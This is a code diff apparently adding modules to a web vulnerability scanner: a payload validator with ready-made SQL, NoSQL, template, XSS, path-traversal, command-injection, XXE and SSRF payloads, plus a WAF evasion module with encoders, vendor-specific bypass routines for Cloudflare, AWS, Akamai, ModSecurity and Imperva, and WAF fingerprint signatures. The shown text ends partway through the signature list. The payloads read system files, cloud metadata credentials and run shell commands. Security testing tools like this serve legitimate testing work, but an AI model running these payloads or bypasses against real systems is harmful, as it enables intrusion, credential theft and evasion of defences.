@@ -105,6 +105,1267 @@ class BaselineResponse:
     content_type: str
 
 
+@dataclass
+class InteractivePayload:
+    """Interactive payload with unique canary for validation."""
+    payload: str
+    canary: str
+    validation_type: str  # "canary", "time", "math", "error", "oob"
+    expected_result: str
+    timeout_threshold_ms: float = 0.0  # For time-based
+
+
+class InteractiveValidator:
+    """
+    Interactive payload validation system.
+    
+    Uses unique canary values and interactive techniques to confirm
+    true positives and eliminate false positives.
+    
+    Validation types:
+    - canary: Unique random string that must appear in response
+    - time: Time-based delay verification
+    - math: Mathematical expression that evaluates to expected result
+    - error: Specific error message pattern
+    - reflect: Payload reflected in response (for XSS)
+    - oob: Out-of-band callback (DNS/HTTP)
+    """
+    
+    @staticmethod
+    def generate_canary(prefix: str = "ASF") -> str:
+        """Generate unique canary value for payload tracking."""
+        import uuid
+        import random
+        # Format: ASF_<random_hex>_<checksum>
+        rand_part = uuid.uuid4().hex[:12]
+        checksum = hex(sum(ord(c) for c in rand_part) % 256)[2:].zfill(2)
+        return f"{prefix}_{rand_part}_{checksum}"
+    
+    @staticmethod
+    def generate_math_canary() -> tuple[str, str]:
+        """Generate math expression and expected result."""
+        import random
+        a = random.randint(1000, 9999)
+        b = random.randint(100, 999)
+        # Use multiplication - result is unique enough
+        return f"{a}*{b}", str(a * b)
+    
+    @staticmethod
+    def get_sqli_payloads() -> list[InteractivePayload]:
+        """Generate SQL injection payloads with interactive validation."""
+        canary = InteractiveValidator.generate_canary("SQLI")
+        math_expr, math_result = InteractiveValidator.generate_math_canary()
+        
+        return [
+            # Time-based blind SQLi - most reliable
+            InteractivePayload(
+                payload="1'; WAITFOR DELAY '0:0:5'--",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload="1' AND SLEEP(5)#",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload="1' AND (SELECT SLEEP(5))--",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload="1'; SELECT pg_sleep(5)--",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay (PostgreSQL)",
+                timeout_threshold_ms=4500
+            ),
+            # Union-based with canary
+            InteractivePayload(
+                payload=f"' UNION SELECT '{canary}',NULL,NULL--",
+                canary=canary,
+                validation_type="canary",
+                expected_result=f"Canary {canary} in response"
+            ),
+            InteractivePayload(
+                payload=f"' UNION SELECT 1,'{canary}',3--",
+                canary=canary,
+                validation_type="canary",
+                expected_result=f"Canary {canary} in response"
+            ),
+            # Error-based - specific errors
+            InteractivePayload(
+                payload="'",
+                canary="",
+                validation_type="error",
+                expected_result="sql syntax|mysql|postgresql|oracle|sqlite"
+            ),
+            InteractivePayload(
+                payload="1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+                canary="",
+                validation_type="error",
+                expected_result="XPATH syntax|extractvalue|version"
+            ),
+            # Boolean-based with math
+            InteractivePayload(
+                payload=f"1' AND 1=1 UNION SELECT {math_expr}--",
+                canary=math_result,
+                validation_type="math",
+                expected_result=f"Math result {math_result} in response"
+            ),
+        ]
+    
+    @staticmethod
+    def get_nosql_payloads() -> list[InteractivePayload]:
+        """Generate NoSQL injection payloads with interactive validation."""
+        canary = InteractiveValidator.generate_canary("NOSQL")
+        
+        return [
+            # MongoDB operator injection
+            InteractivePayload(
+                payload='{"$gt": ""}',
+                canary="",
+                validation_type="auth_bypass",
+                expected_result="200 with token/session data"
+            ),
+            InteractivePayload(
+                payload='{"$ne": null}',
+                canary="",
+                validation_type="auth_bypass", 
+                expected_result="200 with token/session data"
+            ),
+            InteractivePayload(
+                payload='{"$regex": ".*"}',
+                canary="",
+                validation_type="auth_bypass",
+                expected_result="200 with token/session data"
+            ),
+            # Time-based using $where
+            InteractivePayload(
+                payload='{"$where": "sleep(5000)"}',
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload='{"$where": "function(){sleep(5000);return true;}"}',
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            # Error-based
+            InteractivePayload(
+                payload='{"$where": "invalid.syntax("}',
+                canary="",
+                validation_type="error",
+                expected_result="SyntaxError|MongoError|BSON"
+            ),
+        ]
+    
+    @staticmethod
+    def get_ssti_payloads() -> list[InteractivePayload]:
+        """Generate SSTI payloads with math-based validation."""
+        math_a, math_b = 7919, 7927  # Prime numbers for unique result
+        expected = str(math_a * math_b)  # 62769713
+        
+        return [
+            # Jinja2/Twig - double curly braces
+            InteractivePayload(
+                payload=f"{{{{  {math_a}*{math_b}  }}}}",
+                canary=expected,
+                validation_type="math",
+                expected_result=f"Math result {expected}"
+            ),
+            # Freemarker/Velocity - dollar curly
+            InteractivePayload(
+                payload=f"${{{math_a}*{math_b}}}",
+                canary=expected,
+                validation_type="math",
+                expected_result=f"Math result {expected}"
+            ),
+            # Mako
+            InteractivePayload(
+                payload=f"${{{math_a}*{math_b}}}",
+                canary=expected,
+                validation_type="math",
+                expected_result=f"Math result {expected}"
+            ),
+            # ERB (Ruby)
+            InteractivePayload(
+                payload=f"<%= {math_a}*{math_b} %>",
+                canary=expected,
+                validation_type="math",
+                expected_result=f"Math result {expected}"
+            ),
+            # Smarty
+            InteractivePayload(
+                payload=f"{{{math_a}*{math_b}}}",
+                canary=expected,
+                validation_type="math",
+                expected_result=f"Math result {expected}"
+            ),
+            # Pebble
+            InteractivePayload(
+                payload=f"{{{{ {math_a}*{math_b} }}}}",
+                canary=expected,
+                validation_type="math",
+                expected_result=f"Math result {expected}"
+            ),
+        ]
+    
+    @staticmethod
+    def get_xss_payloads() -> list[InteractivePayload]:
+        """Generate XSS payloads with canary-based validation."""
+        canary = InteractiveValidator.generate_canary("XSS")
+        
+        return [
+            # Basic script tag with canary
+            InteractivePayload(
+                payload=f"<script>alert('{canary}')</script>",
+                canary=canary,
+                validation_type="reflect",
+                expected_result=f"Payload with {canary} reflected unencoded"
+            ),
+            # Event handler with canary
+            InteractivePayload(
+                payload=f"<img src=x onerror=alert('{canary}')>",
+                canary=canary,
+                validation_type="reflect",
+                expected_result=f"Payload with {canary} reflected"
+            ),
+            # SVG with canary
+            InteractivePayload(
+                payload=f"<svg onload=alert('{canary}')>",
+                canary=canary,
+                validation_type="reflect",
+                expected_result=f"SVG payload with {canary} reflected"
+            ),
+            # Attribute escape with canary
+            InteractivePayload(
+                payload=f"' onmouseover='alert(`{canary}`)' data-x='",
+                canary=canary,
+                validation_type="reflect",
+                expected_result=f"Event handler with {canary} reflected"
+            ),
+            # DOM-based with canary
+            InteractivePayload(
+                payload=f"javascript:alert('{canary}')",
+                canary=canary,
+                validation_type="reflect",
+                expected_result=f"JavaScript URI with {canary} reflected"
+            ),
+        ]
+    
+    @staticmethod
+    def get_lfi_payloads() -> list[InteractivePayload]:
+        """Generate LFI payloads with content validation."""
+        return [
+            # Linux passwd file - known content
+            InteractivePayload(
+                payload="../../../etc/passwd",
+                canary="root:x:0:0",
+                validation_type="canary",
+                expected_result="Linux passwd content"
+            ),
+            InteractivePayload(
+                payload="....//....//....//etc/passwd",
+                canary="root:x:0:0",
+                validation_type="canary",
+                expected_result="Linux passwd content (filter bypass)"
+            ),
+            InteractivePayload(
+                payload="..%2f..%2f..%2fetc/passwd",
+                canary="root:x:0:0",
+                validation_type="canary",
+                expected_result="Linux passwd content (URL encoded)"
+            ),
+            InteractivePayload(
+                payload="php://filter/convert.base64-encode/resource=/etc/passwd",
+                canary="cm9vdDp4OjA6",  # base64 of "root:x:0:"
+                validation_type="canary",
+                expected_result="Base64 encoded passwd"
+            ),
+            # Windows
+            InteractivePayload(
+                payload="..\\..\\..\\windows\\win.ini",
+                canary="[fonts]",
+                validation_type="canary",
+                expected_result="Windows win.ini content"
+            ),
+            InteractivePayload(
+                payload="C:\\Windows\\System32\\drivers\\etc\\hosts",
+                canary="localhost",
+                validation_type="canary",
+                expected_result="Windows hosts file"
+            ),
+        ]
+    
+    @staticmethod
+    def get_rce_payloads() -> list[InteractivePayload]:
+        """Generate RCE payloads with interactive validation."""
+        canary = InteractiveValidator.generate_canary("RCE")
+        
+        return [
+            # Time-based - most reliable for blind RCE
+            InteractivePayload(
+                payload="; sleep 5",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload="| sleep 5",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload="$(sleep 5)",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            InteractivePayload(
+                payload="`sleep 5`",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay",
+                timeout_threshold_ms=4500
+            ),
+            # Windows time-based
+            InteractivePayload(
+                payload="& ping -n 6 127.0.0.1",
+                canary="",
+                validation_type="time",
+                expected_result="5000ms delay (Windows ping)",
+                timeout_threshold_ms=4500
+            ),
+            # Echo canary - confirms execution
+            InteractivePayload(
+                payload=f"; echo {canary}",
+                canary=canary,
+                validation_type="canary",
+                expected_result=f"Canary {canary} in response"
+            ),
+            InteractivePayload(
+                payload=f"| echo {canary}",
+                canary=canary,
+                validation_type="canary",
+                expected_result=f"Canary {canary} in response"
+            ),
+            # Known output
+            InteractivePayload(
+                payload="; id",
+                canary="uid=",
+                validation_type="canary",
+                expected_result="id command output"
+            ),
+            InteractivePayload(
+                payload="| whoami",
+                canary="",
+                validation_type="error",  # Will contain username
+                expected_result="Username in response"
+            ),
+        ]
+    
+    @staticmethod
+    def get_xxe_payloads() -> list[InteractivePayload]:
+        """Generate XXE payloads with content validation."""
+        canary = InteractiveValidator.generate_canary("XXE")
+        
+        return [
+            # File read - Linux
+            InteractivePayload(
+                payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+                canary="root:x:0:0",
+                validation_type="canary",
+                expected_result="Linux passwd via XXE"
+            ),
+            # File read - Windows
+            InteractivePayload(
+                payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+                canary="[fonts]",
+                validation_type="canary",
+                expected_result="Windows win.ini via XXE"
+            ),
+            # Error-based XXE
+            InteractivePayload(
+                payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]><foo>test</foo>',
+                canary="",
+                validation_type="error",
+                expected_result="failed to load|no such file|entity"
+            ),
+            # Parameter entity
+            InteractivePayload(
+                payload=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "{canary}">]><foo>&xxe;</foo>',
+                canary=canary,
+                validation_type="canary",
+                expected_result=f"Canary {canary} via entity expansion"
+            ),
+        ]
+    
+    @staticmethod
+    def get_ssrf_payloads() -> list[InteractivePayload]:
+        """Generate SSRF payloads with content validation."""
+        return [
+            # AWS metadata
+            InteractivePayload(
+                payload="http://169.254.169.254/latest/meta-data/",
+                canary="ami-id",
+                validation_type="canary",
+                expected_result="AWS metadata access"
+            ),
+            InteractivePayload(
+                payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                canary="AccessKeyId",
+                validation_type="canary",
+                expected_result="AWS IAM credentials"
+            ),
+            # GCP metadata
+            InteractivePayload(
+                payload="http://metadata.google.internal/computeMetadata/v1/",
+                canary="attributes",
+                validation_type="canary",
+                expected_result="GCP metadata access"
+            ),
+            # Azure metadata
+            InteractivePayload(
+                payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                canary="compute",
+                validation_type="canary",
+                expected_result="Azure metadata access"
+            ),
+            # Local file via file://
+            InteractivePayload(
+                payload="file:///etc/passwd",
+                canary="root:x:0:0",
+                validation_type="canary",
+                expected_result="Local file read via SSRF"
+            ),
+            # Internal service
+            InteractivePayload(
+                payload="http://127.0.0.1:6379/",
+                canary="redis",
+                validation_type="canary",
+                expected_result="Internal Redis access"
+            ),
+            InteractivePayload(
+                payload="http://localhost:9200/",
+                canary="elasticsearch",
+                validation_type="canary",
+                expected_result="Internal Elasticsearch access"
+            ),
+        ]
+    
+    @staticmethod
+    def validate_response(
+        payload: InteractivePayload, 
+        response_body: str, 
+        response_time_ms: float,
+        response_status: int
+    ) -> tuple[bool, float, str]:
+        """
+        Validate if payload was successful based on validation type.
+        
+        Returns:
+            Tuple of (is_vulnerable, confidence, evidence)
+        """
+        body_lower = response_body.lower()
+        
+        if payload.validation_type == "canary":
+            # Check if canary appears in response
+            if payload.canary and payload.canary in response_body:
+                return True, 0.95, f"Canary '{payload.canary[:30]}...' found in response"
+            return False, 0.1, "Canary not found in response"
+        
+        elif payload.validation_type == "time":
+            # Check if response time exceeds threshold
+            if response_time_ms >= payload.timeout_threshold_ms:
+                return True, 0.90, f"Time-based confirmed: {response_time_ms:.0f}ms (threshold: {payload.timeout_threshold_ms}ms)"
+            return False, 0.1, f"Response time {response_time_ms:.0f}ms below threshold"
+        
+        elif payload.validation_type == "math":
+            # Check if math result appears in response
+            if payload.canary and payload.canary in response_body:
+                return True, 0.95, f"Math result '{payload.canary}' found - template executed"
+            return False, 0.1, f"Math result '{payload.canary}' not found"
+        
+        elif payload.validation_type == "error":
+            # Check for specific error patterns
+            error_patterns = payload.expected_result.lower().split("|")
+            for pattern in error_patterns:
+                if pattern.strip() in body_lower:
+                    return True, 0.85, f"Error pattern '{pattern}' found in response"
+            return False, 0.1, "Expected error pattern not found"
+        
+        elif payload.validation_type == "reflect":
+            # Check if payload is reflected (for XSS)
+            # Must check that it's reflected without encoding
+            if payload.canary in response_body:
+                # Check if it's in HTML context unencoded
+                if f"'{payload.canary}'" in response_body or f'"{payload.canary}"' in response_body:
+                    return True, 0.90, f"XSS payload with canary reflected unencoded"
+                # Check for event handler context
+                if "onerror" in response_body or "onload" in response_body or "onmouseover" in response_body:
+                    if payload.canary in response_body:
+                        return True, 0.85, f"Event handler with canary reflected"
+            return False, 0.1, "Payload not reflected or encoded"
+        
+        elif payload.validation_type == "auth_bypass":
+            # Check for successful authentication indicators
+            if response_status == 200:
+                auth_indicators = ["token", "jwt", "session", "access_token", "refresh_token", 
+                                   "user_id", "username", "email", "role", "admin"]
+                for indicator in auth_indicators:
+                    if indicator in body_lower:
+                        return True, 0.90, f"Auth bypass: '{indicator}' in 200 response"
+            return False, 0.1, f"No auth bypass indicators. Status: {response_status}"
+        
+        return False, 0.0, "Unknown validation type"
+
+
+# =============================================================================
+# WAF Detection and Bypass Module
+# Based on https://github.com/SecH0us3/waf-checker
+# =============================================================================
+
+@dataclass
+class WAFSignature:
+    """WAF detection signature."""
+    name: str
+    headers: dict[str, str | re.Pattern]
+    status_codes: list[int] = field(default_factory=list)
+    body_patterns: list[re.Pattern] = field(default_factory=list)
+    cookie_patterns: list[re.Pattern] = field(default_factory=list)
+
+
+@dataclass
+class WAFDetectionResult:
+    """Result of WAF detection."""
+    detected: bool
+    waf_type: str
+    confidence: float
+    evidence: list[str]
+    bypass_techniques: list[str]
+    captcha_detected: str = ""
+
+
+class PayloadEncoder:
+    """
+    Encoding and obfuscation utilities for WAF bypass techniques.
+    Based on PortSwigger, OWASP, and security community research.
+    """
+    
+    @staticmethod
+    def double_url_encode(payload: str) -> str:
+        """Double URL encode payload. Example: ' -> %27 -> %2527"""
+        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
+    
+    @staticmethod
+    def unicode_encode(payload: str) -> str:
+        """Unicode encode special characters. Example: ' -> \\u0027"""
+        result = ""
+        for char in payload:
+            if char in "\"'<>&=":
+                result += f"\\u{ord(char):04x}"
+            else:
+                result += char
+        return result
+    
+    @staticmethod
+    def html_entity_encode(payload: str, use_hex: bool = False) -> str:
+        """HTML entity encode special characters."""
+        entity_map = {
+            '"': '&#x22;' if use_hex else '&#34;',
+            "'": '&#x27;' if use_hex else '&#39;',
+            '<': '&#x3C;' if use_hex else '&#60;',
+            '>': '&#x3E;' if use_hex else '&#62;',
+            '&': '&#x26;' if use_hex else '&#38;',
+            '=': '&#x3D;' if use_hex else '&#61;',
+            ' ': '&#x20;' if use_hex else '&#32;',
+        }
+        result = ""
+        for char in payload:
+            result += entity_map.get(char, char)
+        return result
+    
+    @staticmethod
+    def mixed_case_encode(payload: str) -> str:
+        """Mixed case encoding for keywords. Example: UNION -> uNiOn"""
+        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE',
+                    'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE', 'SCRIPT', 'ALERT',
+                    'JAVASCRIPT', 'VBSCRIPT', 'ONLOAD', 'ONERROR', 'ONCLICK', 'AND', 'OR']
+        
+        result = payload
+        for keyword in keywords:
+            mixed = ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(keyword))
+            result = re.sub(keyword, mixed, result, flags=re.IGNORECASE)
+        return result
+    
+    @staticmethod
+    def hex_encode(payload: str) -> str:
+        """Hex encode characters. Example: ' -> 0x27"""
+        result = ""
+        for char in payload:
+            if char in "\"'<>&":
+                result += f"0x{ord(char):02x}"
+            else:
+                result += char
+        return result
+    
+    @staticmethod
+    def comment_obfuscate(payload: str) -> str:
+        """SQL comment-based obfuscation. Replace spaces with /**/"""
+        return payload.replace(' ', '/**/')
+    
+    @staticmethod
+    def tab_obfuscate(payload: str) -> str:
+        """Replace spaces with tabs (%09)."""
+        return payload.replace(' ', '%09')
+    
+    @staticmethod
+    def newline_obfuscate(payload: str) -> str:
+        """Replace spaces with newlines (%0A)."""
+        return payload.replace(' ', '%0A')
+    
+    @staticmethod
+    def sql_obfuscation(payload: str) -> list[str]:
+        """Generate SQL-specific obfuscation variations."""
+        variations = [payload]
+        
+        # Comment-based obfuscation
+        variations.append(payload.replace(' ', '/**/'))
+        variations.append(payload.replace(' ', '/*comment*/'))
+        
+        # Space alternatives
+        variations.append(payload.replace(' ', '+'))
+        variations.append(payload.replace(' ', '%09'))  # Tab
+        variations.append(payload.replace(' ', '%0A'))  # LF
+        variations.append(payload.replace(' ', '%0D'))  # CR
+        
+        # Keyword obfuscation
+        if 'SELECT' in payload.upper():
+            variations.append(re.sub(r'SELECT', 'SEL/**/ECT', payload, flags=re.IGNORECASE))
+            variations.append(re.sub(r'SELECT', 'SE/**/LECT', payload, flags=re.IGNORECASE))
+        if 'UNION' in payload.upper():
+            variations.append(re.sub(r'UNION', 'UNI/**/ON', payload, flags=re.IGNORECASE))
+            variations.append(re.sub(r'UNION', 'UN/**/ION', payload, flags=re.IGNORECASE))
+        
+        return list(set(variations))
+    
+    @staticmethod
+    def xss_obfuscation(payload: str) -> list[str]:
+        """Generate XSS-specific obfuscation variations."""
+        variations = [payload]
+        
+        # Case variations
+        variations.append(payload.lower())
+        variations.append(payload.upper())
+        
+        # Script tag variations
+        if '<script>' in payload.lower():
+            variations.append(re.sub(r'<script>', '<SCRIPT>', payload, flags=re.IGNORECASE))
+            variations.append(re.sub(r'<script>', '<ScRiPt>', payload, flags=re.IGNORECASE))
+            variations.append(re.sub(r'<script>', '<script \\>', payload, flags=re.IGNORECASE))
+        
+        # JavaScript protocol variations
+        if 'javascript:' in payload.lower():
+            variations.append(re.sub(r'javascript:', 'JAVASCRIPT:', payload, flags=re.IGNORECASE))
+            variations.append(re.sub(r'javascript:', 'JaVaScRiPt:', payload, flags=re.IGNORECASE))
+        
+        return list(set(variations))
+    
+    @staticmethod
+    def generate_bypass_variations(payload: str, attack_type: str = "generic") -> list[str]:
+        """Generate comprehensive bypass variations for any payload."""
+        variations = [payload]
+        
+        # Basic encodings
+        variations.append(PayloadEncoder.double_url_encode(payload))
+        variations.append(PayloadEncoder.unicode_encode(payload))
+        variations.append(PayloadEncoder.html_entity_encode(payload, use_hex=False))
+        variations.append(PayloadEncoder.html_entity_encode(payload, use_hex=True))
+        variations.append(PayloadEncoder.mixed_case_encode(payload))
+        variations.append(PayloadEncoder.hex_encode(payload))
+        variations.append(urllib.parse.quote(payload, safe=''))
+        
+        # Attack-specific obfuscation
+        if 'sql' in attack_type.lower():
+            variations.extend(PayloadEncoder.sql_obfuscation(payload))
+        elif 'xss' in attack_type.lower():
+            variations.extend(PayloadEncoder.xss_obfuscation(payload))
+        
+        return list(set(variations))
+
+
+class WAFBypasses:
+    """WAF-specific bypass utilities."""
+    
+    @staticmethod
+    def cloudflare_bypass(payload: str) -> list[str]:
+        """Cloudflare-specific bypasses."""
+        bypasses = [payload]
+        
+        # Unicode encoding for special chars
+        bypasses.append(payload.replace("'", "\\u0027"))
+        bypasses.append(payload.replace('"', "\\u0022"))
+        bypasses.append(payload.replace('<', "\\u003c"))
+        bypasses.append(payload.replace('>', "\\u003e"))
+        
+        # Alternative space characters
+        bypasses.append(payload.replace(' ', '\\u00A0'))  # Non-breaking space
+        bypasses.append(payload.replace(' ', '\\u2000'))  # En quad
+        
+        # Unicode quote variations
+        bypasses.append(payload.replace("'", "\uFF07"))
+        bypasses.append(payload.replace('"', "\uFF02"))
+        
+        # Prototype pollution bypasses
+        if '__proto__' in payload.lower():
+            bypasses.append(re.sub(r'__proto__', '__pr\\u006f\\u0074o__', payload, flags=re.IGNORECASE))
+            bypasses.append(re.sub(r'__proto__', '__pro__proto__to__', payload, flags=re.IGNORECASE))
+        
+        return list(set(bypasses))
+    
+    @staticmethod
+    def aws_waf_bypass(payload: str) -> list[str]:
+        """AWS WAF-specific bypasses."""
+        bypasses = [payload]
+        
+        # Character set bypasses
+        bypasses.append(payload.replace('=', '\\u003D'))
+        bypasses.append(payload.replace('&', '\\u0026'))
+        
+        # Unicode normalization
+        try:
+            import unicodedata
+            bypasses.append(unicodedata.normalize('NFD', payload))
+            bypasses.append(unicodedata.normalize('NFKD', payload))
+            bypasses.append(unicodedata.normalize('NFKC', payload))
+        except Exception:
+            pass
+        
+        return list(set(bypasses))
+    
+    @staticmethod
+    def modsecurity_bypass(payload: str) -> list[str]:
+        """ModSecurity-specific bypasses."""
+        bypasses = [payload]
+        
+        # Comment-based evasions
+        bypasses.append(re.sub(r'union', 'uni/**/on', payload, flags=re.IGNORECASE))
+        bypasses.append(re.sub(r'select', 'sel/**/ect', payload, flags=re.IGNORECASE))
+        bypasses.append(re.sub(r'script', 'scr/**/ipt', payload, flags=re.IGNORECASE))
+        
+        # Case sensitivity exploits
+        bypasses.append(PayloadEncoder.mixed_case_encode(payload))
+        
+        return list(set(bypasses))
+    
+    @staticmethod
+    def akamai_bypass(payload: str) -> list[str]:
+        """Akamai-specific bypasses."""
+        bypasses = [payload]
+        
+        # URL encoding for specific chars
+        bypasses.append(payload.replace("'", "%27"))
+        bypasses.append(payload.replace('"', "%22"))
+        
+        # Alternative separators
+        bypasses.append(payload.replace(' ', '%09'))  # Tab
+        bypasses.append(payload.replace(' ', '%0b'))  # Vertical tab
+        bypasses.append(payload.replace(' ', '%0c'))  # Form feed
+        
+        # Double URL encode special chars
+        for char in "\"'<>&":
+            bypasses.append(payload.replace(char, urllib.parse.quote(urllib.parse.quote(char, safe=''), safe='')))
+        
+        return list(set(bypasses))
+    
+    @staticmethod
+    def imperva_bypass(payload: str) -> list[str]:
+        """Imperva/Incapsula-specific bypasses."""
+        bypasses = [payload]
+        
+        if '__proto__' in payload.lower():
+            bypasses.append(re.sub(r'__proto__', '__pr\\u006f\\u0074o__', payload, flags=re.IGNORECASE))
+            bypasses.append(re.sub(r'__proto__', '%5f%5fproto%5f%5f', payload, flags=re.IGNORECASE))
+        if 'constructor' in payload.lower():
+            bypasses.append(re.sub(r'constructor', 'const\\u0072uctor', payload, flags=re.IGNORECASE))
+        
+        return list(set(bypasses))
+    
+    @staticmethod
+    def generic_bypass(payload: str) -> list[str]:
+        """Generic WAF bypass techniques."""
+        bypasses = [payload]
+        
+        # Double URL encoding
+        bypasses.append(PayloadEncoder.double_url_encode(payload))
+        
+        # Unicode encoding
+        bypasses.append(PayloadEncoder.unicode_encode(payload))
+        
+        # Mixed case
+        bypasses.append(PayloadEncoder.mixed_case_encode(payload))
+        
+        # Comment insertion
+        bypasses.append(PayloadEncoder.comment_obfuscate(payload))
+        
+        # Null byte
+        bypasses.append(payload + '%00')
+        
+        return list(set(bypasses))
+    
+    @staticmethod
+    def get_waf_specific_bypasses(waf_type: str, payload: str) -> list[str]:
+        """Get bypass payloads specific to detected WAF type."""
+        waf_type_lower = waf_type.lower()
+        
+        if 'cloudflare' in waf_type_lower:
+            return WAFBypasses.cloudflare_bypass(payload)
+        elif 'aws' in waf_type_lower:
+            return WAFBypasses.aws_waf_bypass(payload)
+        elif 'modsecurity' in waf_type_lower:
+            return WAFBypasses.modsecurity_bypass(payload)
+        elif 'akamai' in waf_type_lower:
+            return WAFBypasses.akamai_bypass(payload)
+        elif 'imperva' in waf_type_lower or 'incapsula' in waf_type_lower:
+            return WAFBypasses.imperva_bypass(payload)
+        else:
+            return WAFBypasses.generic_bypass(payload)
+
+
+class WAFDetector:
+    """
+    WAF Detection and Fingerprinting Module.
+    
+    Detects Web Application Firewalls based on:
+    - Response headers
+    - Status codes
+    - Body patterns
+    - Cookie patterns
+    - Timing analysis
+    
+    Based on https://github.com/SecH0us3/waf-checker
+    """
+    
+    # WAF Signatures - comprehensive list
+    WAF_SIGNATURES: list[WAFSignature] = [
+        WAFSignature(
+            name="Cloudflare",
+            headers={
+                "server": "cloudflare",
+                "cf-ray": "",
+                "cf-cache-status": "",
+                "cf-mitigated": "",
+            },
+            status_codes=[403, 429],
+            cookie_patterns=[re.compile(r'__cfduid', re.I), re.compile(r'cf_clearance', re.I), 
+                           re.compile(r'__cf_bm', re.I)],
+            body_patterns=[
+                re.compile(r'attention required.*cloudflare', re.I),
+                re.compile(r'ray id: [a-f0-9]+-[A-Z]{3}', re.I),
+                re.compile(r'Cloudflare Ray ID', re.I),
+                re.compile(r'cdn-cgi/challenge-platform', re.I),
+                re.compile(r'<title>Just a moment\.\.\.</title>', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="AWS WAF",
+            headers={
+                "x-amzn-errortype": "waf",
+                "x-amzn-waf-action": "",
+                "x-amzn-requestid": "",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'aws-waf-token', re.I)],
+            body_patterns=[
+                re.compile(r'AWS WAF', re.I),
+                re.compile(r'403 ERROR.*The request could not be satisfied', re.I),
+                re.compile(r'Request blocked', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Imperva",
+            headers={
+                "x-iinfo": "",
+                "x-cdn": "incapsula",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'incap_ses_', re.I), re.compile(r'visid_incap_', re.I),
+                           re.compile(r'nlbi_', re.I)],
+            body_patterns=[
+                re.compile(r'request unsuccessful.*incapsula incident', re.I),
+                re.compile(r'Incident ID: [0-9-]+', re.I),
+                re.compile(r'Powered By Incapsula', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="F5 BIG-IP",
+            headers={
+                "server": "big-ip",
+                "x-wa-info": "",
+                "f5-trace-id": "",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'TS[0-9a-f]{8}', re.I), re.compile(r'BIGipServer', re.I)],
+            body_patterns=[
+                re.compile(r'the requested url was rejected', re.I),
+                re.compile(r'please consult with your administrator', re.I),
+                re.compile(r'your support id is', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="ModSecurity",
+            headers={
+                "server": "mod_security",
+                "x-mod-security": "",
+            },
+            status_codes=[403, 406],
+            body_patterns=[
+                re.compile(r'Mod_Security', re.I),
+                re.compile(r'request blocked by security policy', re.I),
+                re.compile(r'OWASP.*CRS', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Akamai",
+            headers={
+                "server": "akamaighost",
+                "akamai-origin-hop": "",
+                "x-akamai-transformed": "",
+                "x-akamai-request-id": "",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'ak_bmsc', re.I), re.compile(r'bm_sz', re.I),
+                           re.compile(r'_abck', re.I)],
+            body_patterns=[
+                re.compile(r'reference #[0-9a-f.]+', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Sucuri",
+            headers={
+                "server": "sucuri",
+                "x-sucuri-id": "",
+                "x-sucuri-cache": "",
+            },
+            status_codes=[403],
+            body_patterns=[
+                re.compile(r'sucuri website firewall.*access denied', re.I),
+                re.compile(r'cloudproxy@sucuri\.net', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Wordfence",
+            headers={
+                "x-wordfence-blocked": "",
+                "x-wordfence-action": "",
+            },
+            status_codes=[403, 503],
+            cookie_patterns=[re.compile(r'wfwaf-authcookie', re.I), re.compile(r'wfvt_', re.I)],
+            body_patterns=[
+                re.compile(r'Generated by Wordfence', re.I),
+                re.compile(r'Your access.*has been limited', re.I),
+                re.compile(r'Wordfence Web Application Firewall', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Azure Front Door",
+            headers={
+                "x-azure-ref": "",
+            },
+            status_codes=[403],
+            body_patterns=[
+                re.compile(r'Microsoft-Azure-Application-Gateway', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Google Cloud Armor",
+            headers={
+                "server": "gse",
+            },
+            status_codes=[403, 404],
+            body_patterns=[
+                re.compile(r'Request blocked by Cloud Armor', re.I),
+                re.compile(r'Access Denied.*Cloud Armor', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Barracuda",
+            headers={
+                "server": "barracuda",
+                "x-barracuda-url": "",
+            },
+            status_codes=[403],
